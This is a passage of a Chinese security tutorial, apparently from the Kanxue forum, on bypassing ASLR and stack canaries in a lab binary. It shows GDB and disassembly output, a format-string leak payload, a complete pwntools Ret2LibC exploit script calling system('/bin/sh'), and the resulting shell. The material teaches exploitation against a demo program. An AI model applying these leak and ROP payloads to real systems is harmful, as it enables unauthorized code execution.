一个程序即使占用的空间不多，当想要从中找出指定的16字节数据也不是间容易的事情，参数的读取是从栈上来，这样一看好像就更不容易找到一个跟LibC相关的地址了。

好在`main`函数需要由LibC进行调用，因此`main`函数中`rbp+0x8`的位置一定是存储着返回LibC的基地址。

```text
#0  main () at main.c:26
#1  0x00007ffff7dd7c88 in __libc_start_call_main (
    main=main@entry=0x55555555523b <main>, argc=argc@entry=1, 
    argv=argv@entry=0x7fffffffdf68) at ../sysdeps/nptl/libc_start_call_main.h:58
#2  0x00007ffff7dd7d4c in __libc_start_main_impl (main=0x55555555523b <main>, argc=1, 
    argv=0x7fffffffdf68, init=<optimized out>, fini=<optimized out>, 
    rtld_fini=<optimized out>, stack_end=0x7fffffffdf58) at ../csu/libc-start.c:360
#3  0x00005555555550a5 in _start ()
(gdb) frame 1
#1  0x00007ffff7dd7c88 in __libc_start_call_main (
    main=main@entry=0x55555555523b <main>, argc=argc@entry=1, 
    argv=argv@entry=0x7fffffffdf68) at ../sysdeps/nptl/libc_start_call_main.h:5
```



顺着前面金丝雀的读取，考虑到main函数中并没有分配栈空间，所以`leak_func`函数金丝雀上方就只有`main`函数栈底指针、`main`函数返回地址、`__libc_start_call_main`的栈底指针，`__libc_start_call_main`的返回地址四个参数，那么要获取LibC元素的地址就是第17个参数（13+3）。

获取到LibC中元素的地址后，因为偏移值是固定的，所以不管地址如何随机化，都可以相对关系找到LibC的基地址。

在二进制文件中`__libc_start_call_main`函数对应的是`__libc_init_first`，它会在0x25c86处调用`main`函数，执行后程序指针会执行下条指令，因此0x25c88就是上面获取到的LibC元素的偏移值，元素地址减去元素偏移值就是LibC的基地址。

```text
0000000000025cc0 <__libc_start_main@@GLIBC_2.34>:
   ......
   25d47:	e8 c4 fe ff ff       	call   25c10 <__libc_init_first@@GLIBC_2.2.5+0x10>
   ......
0000000000025c00 <__libc_init_first@@GLIBC_2.2.5>:
   ......
   25c86:	ff d0                	call   *%rax
   25c88:	89 c7                	mov    %eax,%edi
   ......
```

###  

### **3.2.4 完成exploit**



Ret2LibC的构造已经是老生常谈了，在前面文章中已经介绍过，这里就不再过多介绍了。下面会先构造格式化字符串泄露数据，然后再向栈上注入shellcode，返回LibC中的`system`函数，最终成功调用shell。

构造好的explout如下所示。

```text
import pwn

def convert2hex(data):
    return int(data, 16)

def sh_payload_get(target_info):
    payload = b'A' * (0x110 - 0x8)
    payload += pwn.p64(target_info['canary'])
    payload += b'B' * 0x8
    payload += pwn.p64(target_info['libc_base_addr'] + target_info['pop_rdi_ret_offset'])
    payload += pwn.p64(target_info['libc_base_addr'] + target_info['sh_offset'])
    payload += pwn.p64(target_info['libc_base_addr'] + target_info['ret_offset'])
    payload += pwn.p64(target_info['libc_base_addr'] + target_info['system_offset'])
    payload += pwn.p64(target_info['libc_base_addr'] + target_info['exit_offset'])
    return payload

def libc_info_get(target_info):
    target_info['system_offset'] = target_info['libc_info'].symbols['system']
    target_info['exit_offset'] = target_info['libc_info'].symbols['exit']
    target_info['sh_offset'] = target_info['libc_info'].search("/bin/sh").__next__()
    print('[--] system@libc offset: {}, exit@libc offset: {}'.format(hex(target_info['system_offset']), hex(target_info['exit_offset'])))
    print('[--] /bin/sh@libc offset: {}'.format(hex(target_info['sh_offset'])))
    return target_info

def canary_get(target_info):
    target_info['canary'] = convert2hex(target_info['leak_data'].decode().split('.')[0])
    print('[**] canary value: {}'.format(hex(target_info['canary'])))
    return target_info

def libc_base_get(target_info):
    random_libc = convert2hex(target_info['leak_data'].decode().split('.')[1])
    print('[**] libc leaked address: {}'.format(hex(random_libc)))
    target_info['libc_base_addr'] = random_libc - target_info['libc_leak_ele_offset']
    print('[--] libc base address: {}'.format(target_info['libc_base_addr']))
    return target_info

def leak_payload_get():
    payload = b'%13$llx.%17$llx.'
    payload += b'endtag'
    return payload

def main():
    target_info = {
        'exec_path': './aslr_bypass_example',
        'libc_info': '/usr/lib/libc.so.6',
        'leak_data': 0x0,
        'libc_leak_ele_offset': 0x25c88,
        'canary': 0x0,
        'libc_base_addr': 0x0,
        'pop_rdi_ret_offset': 0xfd8c4,
        'ret_offset': 0xfd8c5,
        'system_offset': 0x0,
        'sh_offset': 0x0,
        'exit_offset': 0x0
    }
    pwn.context.binary = pwn.ELF(target_info['exec_path'])
    conn = pwn.process([target_info['exec_path']])
    target_info['libc_info'] = pwn.ELF(target_info['libc_info'])

    pwn.pause()

    leak_payload = leak_payload_get()
    conn.sendlineafter('>>>>\n', leak_payload)
    target_info['leak_data'] = conn.recvuntil('endtag')
    print(target_info['leak_data'])
    target_info['leak_data'] = target_info['leak_data'][0:-1]

    target_info = libc_base_get(target_info)
    target_info = canary_get(target_info)
    target_info = libc_info_get(target_info)
    sh_payload = sh_payload_get(target_info)
    conn.sendlineafter('<<<<\n', sh_payload)
    conn.interactive()

if __name__ == '__main__':
    main()
    sys.exit(0)
```

##  

## **3.3 成功PWN**



完成exploit的构建并运行后，就可以成功获取shell了。

```text
[*] Switching to interactive mode
$ whoami
test
```







看雪ID：福建炒饭乡会

[https://bbs.kanxue.com/user-home-1000123.htm](https://link.zhihu.com/?target=https%3A//bbs.kanxue.com/user-home-1000123.htm)

*本文为看雪论坛优秀文章，由 福建炒饭乡会 原创，转载请注明来自看雪社区